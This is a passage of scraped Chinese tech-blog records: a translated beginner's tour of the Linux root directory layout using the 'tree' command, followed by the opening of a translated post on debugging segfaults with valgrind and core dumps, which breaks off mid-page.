v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f971566793726\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo pacman -S tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f971566793726-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f971566793726-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f971566793726-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f971566793726-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>……等等。</p>\n<p>一旦安装好，在终端窗口运行 <code>tree</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f974905453897\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f974905453897-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f974905453897-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f974905453897-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f974905453897-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>上述指令中的 <code>/</code> 指的是根目录。系统中的其他目录都是从根目录分支而出，当你运行 <code>tree</code> 命令，并且告诉它从根目录开始，那么你就可以看到整个目录树，系统中的所有目录及其子目录，还有它们的文件。</p>\n<p>如果你已经使用你的系统有一段时间了，这可能需要一段时间，因为即使你自己还没有生成很多文件，Linux 系统及其应用程序总是在记录、缓存和存储各种临时文件。文件系统中的条目数量会快速增长。</p>\n<p>不过，不要感到不知所措。 相反，试试这个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a290f977511009270\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree -L 1 /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a290f977511009270-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a290f977511009270-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a290f977511009270-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">L</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a290f977511009270-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>你应该看到如图 1 所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/7d8ec1149862c8f94f7abb5f230f2211.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>tree</em></p>\n<p>上面的指令可以翻译为“只显示以 <code>/</code>（根目录） 开头的目录树的第一级”。 <code>-L</code> 选项告诉树你想看到多少层目录。</p>\n<p>大多数 Linux 发行版都会向你显示与你在上图中看到的相同或非常类似的结构。 这意味着，即使你现在感到困惑，掌握这一点，你将掌握大部分（如果不是全部的话）全世界的 Linux 文件系统。</p>\n<p>为了让你开始走上掌控之路，让我们看看每个目录的用途。 当我们查看每一个目录的时候，你可以使用 <code>ls</code> 来查看他们的内容。</p>\n<h3 id=\"toc_2\">目录</h3>\n<p>从上到下，你所看到的目录如下</p>\n<h4 id=\"toc_3\">/bin</h4>\n<p><code>/bin</code> 目录是包含一些二进制文件的目录，即可以运行的一些应用程序。 你会在这个目录中找到上面提到的 <code>ls</code> 程序，以及用于新建和删除文件和目录、移动它们基本工具。还有其它一些程序，等等。文件系统树的其他部分有更多的 <em>bin</em> 目录，但我们将在一会儿讨论这些目录。</p>\n<h4 id=\"toc_4\">/boot</h4>\n<p><code>/boot</code> 目录包含启动系统所需的文件。我必须要说吗？ 好吧，我会说：<strong>不要动它</strong>！ 如果你在这里弄乱了其中一个文件，你可能无法运行你的 Linux，修复被破坏的系统是非常痛苦的一件事。 另一方面，不要太担心无意中破坏系统：你必须拥有超级用户权限才能执行此操作。</p>\n<h4 id=\"toc_5\">/dev</h4>\n<p><code>/dev 目录包含设备文件。 其中许多是在启动时或甚至在运行时生成的。 例如，如果你将新的网络摄像头或 USB 随身碟连接到你的机器中，则会自动弹出一个新的设备条目。</code></p>\n<h4 id=\"toc_6\">/etc</h4>\n<p><code>/etc</code> 的目录名称会让人变得非常的困惑。<code>/etc</code> 得名于最早的 Unix 系统们，它的字面意思是 “etcetera”（诸如此类） ，因为它是系统文件管理员不确定在哪里放置的文件的垃圾场。</p>\n<p>现在，说 <code>/etc</code> 是“要配置的所有内容Everything To Configure”更为恰当，因为它包含大部分（如果不是全部的话）的系统配置文件。 例如，包含系统名称、用户及其密码、网络上计算机名称以及硬盘上分区的安装位置和时间的文件都在这里。 再说一遍，如果你是 Linux 的新手，最好是不要在这里接触太多，直到你对系统的工作有更好的理解。</p>\n<h4 id=\"toc_7\">/home</h4>\n<p><code>/home</code> 是你可以找到用户个人目录的地方。在我的情况下，<code>/home</code> 下有两个目录：<code>/home/paul</code>，其中包含我所有的东西；另外一个目录是 <code>/home/guest</code> 目录，以防有客人需要使用我的电脑。</p>\n<h4 id=\"toc_8\">/lib</h4>\n<p><code>/lib</code> 是库文件所在的地方。库是包含应用程序可以使用的代码文件。它们包含应用程序用于在桌面上绘制窗口、控制外围设备或将文件发送到硬盘的代码片段。</p>\n<p>在文件系统周围散布着更多的 <code>lib</code> 目录，但是这个直接挂载在 <code>/</code> 的 <code>/lib</code> 目录是特殊的，除此之外，它包含了所有重要的内核模块。 内核模块是使你的显卡、声卡、WiFi、打印机等工作的驱动程序。</p>\n<h4 id=\"toc_9\">/media</h4>\n<p>在 <code>/media</code> 目录中，当你插入外部存储器试图访问它时，将自动挂载它。与此列表中的大多数其他项目不同，<code>/media</code> 并不追溯到 1970 年代，主要是因为当计算机正在运行而动态地插入和检测存储（U 盘、USB 硬盘、SD 卡、外部 SSD 等)，这是近些年才发生的事。</p>\n<h4 id=\"toc_10\">/mnt</h4>\n<p>然而，<code>/mnt</code> 目录是一些过去的残余。这是你手动挂载存储设备或分区的地方。现在不常用了。</p>\n<h4 id=\"toc_11\">/opt</h4>\n<p><code>/opt</code> 目录通常是你编译软件（即，你从源代码构建，并不是从你的系统的软件库中安装软件）的地方。应用程序最终会出现在 <code>/opt/bin</code> 目录，库会在 <code>/opt/lib</code> 目录中出现。</p>\n<p>稍微的题外话：应用程序和库的另一个地方是 <code>/usr/local</code>，在这里安装软件时，也会有 <code>/usr/local/bin</code> 和 <code>/usr/local/lib</code> 目录。开发人员如何配置文件来控制编译和安装过程，这就决定了软件安装到哪个地方。</p>\n<h4 id=\"toc_12\">/proc</h4>\n<p><code>/proc</code>，就像 <code>/dev</code> 是一个虚拟目录。它包含有关你的计算机的信息，例如关于你的 CPU 和你的 Linux 系统正在运行的内核的信息。与 <code>/dev</code> 一样，文件和目录是在计算机启动或运行时生成的，因为你的系统正在运行且会发生变化。</p>\n<h4 id=\"toc_13\">/root</h4>\n<p><code>/root</code> 是系统的超级用户（也称为“管理员”）的主目录。 它与其他用户的主目录是分开的，<strong>因为你不应该动它</strong>。 所以把自己的东西放在你自己的目录中，伙计们。</p>\n<h4 id=\"toc_14\">/run</h4>\n<p><code>/run</code> 是另一个新出现的目录。系统进程出于自己不可告人的原因使用它来存储临时数据。这是另一个<strong>不要动它</strong>的文件夹。</p>\n<h4 id=\"toc_15\">/sbin</h4>\n<p><code>/sbin</code> 与 <code>/bin</code> 类似，但它包含的应用程序只有超级用户（即首字母的 <code>s</code> ）才需要。你可以使用 <code>sudo</code> 命令使用这些应用程序，该命令暂时允许你在许多 Linux 发行版上拥有超级用户权限。<code>/sbin</code> 目录通常包含可以安装、删除和格式化各种东西的工具。你可以想象，如果你使用不当，这些指令中有一些是致命的，所以要小心处理。</p>\n<h4 id=\"toc_16\">/usr</h4>\n<p><code>/usr</code> 目录是在 UNIX 早期用户的主目录所处的地方。然而，正如我们上面看到的，现在 <code>/home</code> 是用户保存他们的东西的地方。如今，<code>/usr</code> 包含了大量目录，而这些目录又包含了应用程序、库、文档、壁纸、图标和许多其他需要应用程序和服务共享的内容。</p>\n<p>你还可以在 <code>/usr</code> 目录下找到 <code>bin</code>，<code>sbin</code>，<code>lib</code> 目录，它们与挂载到根目录下的那些有什么区别呢？现在的区别不是很大。在早期，<code>/bin</code> 目录（挂载在根目录下的）只会包含一些基本的命令，例如 <code>ls</code>、<code>mv</code> 和 <code>rm</code> ；这是一些在安装系统的时候就会预装的一些命令，用于维护系统的一个基本的命令。 而 <code>/usr/bin</code> 目录则包含了用户自己安装和用于工作的软件，例如文字处理器，浏览器和一些其他的软件。</p>\n<p>但是许多现代的 Linux 发行版只是把所有的东西都放到 <code>/usr/bin</code> 中，并让 <code>/bin</code> 指向 <code>/usr/bin</code>，以防彻底删除它会破坏某些东西。因此，Debian、Ubuntu 和 Mint 仍然保持 <code>/bin</code> 和 <code>/usr/bin</code> （和 <code>/sbin</code> 和 <code>/usr/sbin</code> ）分离；其他的，比如 Arch 和它衍生版，只是有一个“真实”存储二进制程序的目录，<code>/usr/bin</code>，其余的任何 <code>bin</code> 目录是指向 <code>/usr/</code>bin 的“假”目录。</p>\n<h4 id=\"toc_17\">/srv</h4>\n<p><code>/srv</code> 目录包含服务器的数据。如果你正在 Linux 机器上运行 Web 服务器，你网站的 HTML文件将放到 <code>/srv/http</code>（或 <code>/srv/www</code>）。 如果你正在运行 FTP 服务器，则你的文件将放到 <code>/srv/ftp</code>。</p>\n<h4 id=\"toc_18\">/sys</h4>\n<p><code>/sys</code> 是另一个类似 <code>/proc</code> 和 <code>/dev</code> 的虚拟目录，它还包含连接到计算机的设备的信息。</p>\n<p>在某些情况下，你还可以操纵这些设备。 例如，我可以通过修改存储在 <code>/sys/devices/pci0000:00/0000:00:02.0/drm/card1/card1-eDP-1/intel_backlight/brightness</code> 中的值来更改笔记本电脑屏幕的亮度（在你的机器上你可能会有不同的文件）。但要做到这一点，你必须成为超级用户。原因是，与许多其它虚拟目录一样，在 <code>/sys</code> 中打乱内容和文件可能是危险的，你可能会破坏系统。直到你确信你知道你在做什么。否则不要动它。</p>\n<h4 id=\"toc_19\">/tmp</h4>\n<p><code>/tmp</code> 包含临时文件，通常由正在运行的应用程序放置。文件和目录通常（并非总是）包含应用程序现在不需要但以后可能需要的数据。</p>\n<p>你还可以使用 <code>/tmp</code> 来存储你自己的临时文件 —— <code>/tmp</code> 是少数挂载到根目录下而你可以在不成为超级用户的情况下与它进行实际交互的目录之一。</p>\n<h4 id=\"toc_20\">/var</h4>\n<p><code>/var</code> 最初被如此命名是因为它的内容被认为是可变的variable，因为它经常变化。今天，它有点用词不当，因为还有许多其他目录也包含频繁更改的数据，特别是我们上面看到的虚拟目录。</p>\n<p>不管怎样，<code>/var</code> 目录包含了放在 <code>/var/log</code> 子目录的日志文件之类。日志是记录系统中发生的事件的文件。如果内核中出现了什么问题，它将被记录到 <code>/var/log</code> 下的文件中；如果有人试图从外部侵入你的计算机，你的防火墙也将记录尝试。它还包含用于任务的假脱机程序。这些“任务”可以是你发送给共享打印机必须等待执行的任务，因为另一个用户正在打印一个长文档，或者是等待递交给系统上的用户的邮件。</p>\n<p>你的系统可能还有一些我们上面没有提到的目录。例如，在屏幕截图中，有一个 <code>/snap</code> 目录。这是因为这张截图是在 Ubuntu 系统上截取的。Ubuntu 最近将 <a href=\"https://www.ubuntu.com/desktop/snappy\">snap</a> 包作为一种分发软件的方式。<code>/snap</code> 目录包含所有文件和从 snaps 安装的软件。</p>\n<h3 id=\"toc_21\">更深入的研究</h3>\n<p>这里仅仅谈了根目录，但是许多子目录都指向它们自己的一组文件和子目录。图 2 给出了基本文件系统的总体概念（图片是在 Paul Gardner 的 CC BY-SA 许可下提供的），<a href=\"https://en.wikipedia.org/wiki/Unix_filesystem#Conventional_directory_layout\">Wikipedia 对每个目录的用途进行了总结</a>。</p>\n<p><img class=\"aligncenter\" title=\"filesystem\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fe6ae1c96f1282575403c8fd4706830f.png\" alt=\"filesystem\"></p>\n<p style=\"text-align: center\"><em>图 2：标准 Unix 文件系统</em></p>\n<p>要自行探索文件系统，请使用 <code>cd</code> 命令：<code>cd</code>将带你到你所选择的目录（ <code>cd</code> 代表更改目录）。</p>\n<p>如果你不知道你在哪儿，<code>pwd</code>会告诉你，你到底在哪里，（ <code>pwd</code> 代表打印工作目录 ），同时 <code>cd</code>命令在没有任何选项或者参数的时候，将会直接带你到你自己的主目录，这是一个安全舒适的地方。</p>\n<p>最后，<code>cd ..</code>将会带你到上一层目录，会使你更加接近根目录，如果你在 <code>/usr/share/wallpapers</code> 目录，然后你执行 <code>cd ..</code> 命令，你将会跳转到 <code>/usr/share</code> 目录</p>\n<p>要查看目录里有什么内容，使用 <code>ls</code> 或这简单的使用 <code>l</code> 列出你所在目录的内容。</p>\n<p>当然，你总是可以使用 <code>tree</code> 来获得目录中内容的概述。在 <code>/usr/share</code> 上试试——里面有很多有趣的东西。</p>\n<h3 id=\"toc_22\">总结</h3>\n<p>尽管 Linux 发行版之间存在细微差别，但它们的文件系统的布局非常相似。 你可以这么说：一旦你了解一个，你就会都了解了。 了解文件系统的最好方法就是探索它。 因此，伴随 <code>tree</code> ，<code>ls</code> 和 <code>cd</code> 进入未知的领域吧。</p>\n<p>你不会只是因为查看文件系统就破坏了文件系统，因此请从一个目录移动到另一个目录并进行浏览。 很快你就会发现 Linux 文件系统及其布局的确很有意义，并且你会直观地知道在哪里可以找到应用程序，文档和其他资源。</p>\n<p>通过 Linux 基金会和 edX 免费的 “<a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">Linux入门</a>” 课程了解更多有关 Linux 的信息。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114189\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114189votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114189\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux", "author": "Paul Brown", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "在 Linux 上如何得到一个段错误的核心转储", "createdate": "2018/07/14", "url": "http://blog.jobbole.com/114211/", "url_object_id": "5a2415268c5f41548f265013b49fd955", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9834-1.html\">Linux中国/Stephen</a>   </div><p>本周工作中，我花了整整一周的时间来尝试调试一个段错误。我以前从来没有这样做过，我花了很长时间才弄清楚其中涉及的一些基本事情（获得核心转储、找到导致段错误的行号）。于是便有了这篇博客来解释如何做那些事情！</p>\n<p>在看完这篇博客后，你应该知道如何从“哦，我的程序出现段错误，但我不知道正在发生什么”到“我知道它出现段错误时的堆栈、行号了！ ”。</p>\n<h3 id=\"toc_1\">什么是段错误？</h3>\n<p>“段错误segmentation fault”是指你的程序尝试访问不允许访问的内存地址的情况。这可能是由于：</p>\n<ul>\n<li>试图解引用空指针（你不被允许访问内存地址 <code>0</code>）；</li>\n<li>试图解引用其他一些不在你内存（LCTT 译注：指不在合法的内存地址区间内）中的指针；</li>\n<li>一个已被破坏并且指向错误的地方的 C++ 虚表指针C++ vtable pointer，这导致程序尝试执行没有执行权限的内存中的指令；</li>\n<li>其他一些我不明白的事情，比如我认为访问未对齐的内存地址也可能会导致段错误（LCTT 译注：在要求自然边界对齐的体系结构，如 MIPS、ARM 中更容易因非对齐访问产生段错误）。</li>\n</ul>\n<p>这个“C++ 虚表指针”是我的程序发生段错误的情况。我可能会在未来的博客中解释这个，因为我最初并不知道任何关于 C++ 的知识，并且这种虚表查找导致程序段错误的情况也是我所不了解的。</p>\n<p>但是！这篇博客后不是关于 C++ 问题的。让我们谈论的基本的东西，比如，我们如何得到一个核心转储？</p>\n<h3 id=\"toc_2\">步骤1：运行 valgrind</h3>\n<p>我发现找出为什么我的程序出现段错误的最简单的方式是使用 <code>valgrind</code>：我运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310c5172864156\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalgrind -v your-program\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310c5172864156-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310c5172864156-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310c5172864156-1\"><span class=\"crayon-v\">valgrind</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">program</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310c5172864156-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这给了我一个故障时的堆栈调用序列。 简洁！</p>\n<p>但我想也希望做一个更深入调查，并找出些 <code>valgrind</code> 没告诉我的信息！ 所以我想获得一个核心转储并探索它。</p>\n<h3 id=\"toc_3\">如何获得一个核心转储</h3>\n<p>核心转储core dump是您的程序内存的一个副本，并且当您试图调试您的有问题的程序哪里出错的时候它非常有用。</p>\n<p>当您的程序出现段错误，Linux 的内核有时会把一个核心转储写到磁盘。 当我最初试图获得一个核心转储时，我很长一段时间非常沮丧，因为 – Linux 没有生成核心转储！我的核心转储在哪里？</p>\n<p>这就是我最终做的事情：</p>\n<ol>\n<li>在启动我的程序之前运行 <code>ulimit -c unlimited</code></li>\n<li>运行 <code>sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code></li>\n</ol>\n<h3 id=\"toc_4\">ulimit：设置核心转储的最大尺寸</h3>\n<p><code>ulimit -c</code> 设置核心转储的最大尺寸。 它往往设置为 0，这意味着内核根本不会写核心转储。 它以千字节为单位。 <code>ulimit</code> 是按每个进程分别设置的 —— 你可以通过运行 <code>cat /proc/PID/limit</code> 看到一个进程的各种资源限制。</p>\n<p>例如这些是我的系统上一个随便一个 Firefox 进程的资源限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310cf131217178\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 